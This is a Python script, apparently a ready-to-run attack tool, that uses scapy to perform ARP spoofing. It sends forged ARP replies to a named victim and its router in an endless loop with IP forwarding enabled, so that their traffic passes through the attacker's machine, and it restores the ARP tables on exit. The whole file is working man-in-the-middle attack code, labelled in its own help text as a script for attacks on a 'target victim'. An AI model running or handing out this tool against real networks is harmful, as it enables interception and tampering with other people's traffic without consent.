#!/usr/bin/env python3
doggy = """
    __    __
    \/----\/
     \0  0/    WOOF!
     _\  /_
   _|  \/  |_
  | | |  | | |
 _| | |  | | |_
"---|_|--|_|---"
"""
import os
import sys
import time
import argparse
import logging
import socket
import scapy.all as scapy
def setup_logging(verbose=False, log_file=None):
    level = logging.DEBUG if verbose else logging.INFO
    format_str = '%(asctime)s - %(levelname)s - %(message)s'
    if log_file:
        logging.basicConfig(level=level, format=format_str, filename=log_file)
    else:
        logging.basicConfig(level=level, format=format_str)
def validate_ip(ip):
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False
def get_local_ip():
    try:
        return scapy.get_if_addr()
    except OSError:
        logging.error("Failed to fetch the local IP address")
        sys.exit(1)
def get_mac(ip):
    try:
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False, retry=3)[0]
        if answered_list:
            return answered_list[0][1].hwsrc
    except IndexError:
        pass
def arp_spoof(target_ip, router_ip, count=100, interval=1):
    target_mac = get_mac(target_ip)
    router_mac = get_mac(router_ip)
    if target_mac and router_mac:
        packet_to_target = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=router_ip)
        packet_to_router = scapy.ARP(op=2, pdst=router_ip, hwdst=router_mac, psrc=target_ip)
        for _ in range(count):
            scapy.send(packet_to_target, verbose=False)
            scapy.send(packet_to_router, verbose=False)
            logging.info("Sent ARP packets to %s and %s", target_ip, router_ip)
            time.sleep(interval)
    else:
        logging.error("Failed to get MAC addresses for %s and %s", target_ip, router_ip)
def restore_arp_tables(target_ip, router_ip):
    target_mac = get_mac(target_ip)
    router_mac = get_mac(router_ip)
    if target_mac and router_mac:
        packet_to_target = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=router_ip, hwsrc=router_mac)
        packet_to_router = scapy.ARP(op=2, pdst=router_ip, hwdst=router_mac, psrc=target_ip, hwsrc=target_mac)
        scapy.send(packet_to_target, count=4, verbose=False)
        scapy.send(packet_to_router, count=4, verbose=False)
        logging.info("ARP tables reset for %s and %s", target_ip, router_ip)
    else:
        logging.error("Failed to reset ARP tables for %s and %s", target_ip, router_ip)
def enable_ip_forwarding():
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "r") as file:
            if file.read() == "0\n":
                with open("/proc/sys/net/ipv4/ip_forward", "w") as file:
                    file.write("1\n")
                    logging.info("IP forwarding is now on")
    except IOError:
        logging.exception("Failed to enable IP forwarding")
def disable_ip_forwarding():
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "r") as file:
            if file.read() == "1\n":
                with open("/proc/sys/net/ipv4/ip_forward", "w") as file:
                    file.write("0\n")
                    logging.info("IP forwarding is now off")
    except IOError:
        logging.exception("Failed to disable IP forwarding")
def main(args):
    target_ip = args.target_ip
    router_ip = args.router_ip
    verbose = args.verbose
    log_file = args.log_file
    setup_logging(verbose, log_file)
    if not validate_ip(target_ip) or not validate_ip(router_ip):
        logging.error("The provided IP addresses are invalid")
        sys.exit(1)
    try:
        enable_ip_forwarding()
        logging.info("Preparing to launch ARP attacks...")
        while True:
            arp_spoof(target_ip, router_ip, args.packet_count, args.interval)
            arp_spoof(router_ip, target_ip, args.packet_count, args.interval)
    except KeyboardInterrupt:
        logging.info("Detected Ctrl+C, resetting the network...")
        restore_arp_tables(target_ip, router_ip)
        restore_arp_tables(router_ip, target_ip)
        disable_ip_forwarding()
        sys.exit(0)
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Script for ARP spoofing attacks")
    parser.add_argument("target_ip", help="IP address of the target victim")
    parser.add_argument("router_ip", help="IP address of the router")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose mode for detailed logging")
    parser.add_argument("-c", "--packet_count", type=int, default=100, help="Number of ARP packets to send (default: 100)")
    parser.add_argument("-p", "--interval", type=int, default=1, help="Interval between ARP packets (default: 1 second)")
    parser.add_argument("-l", "--log_file", help="File to write log output")
    args = parser.parse_args()
    print(doggy)
    main(args)
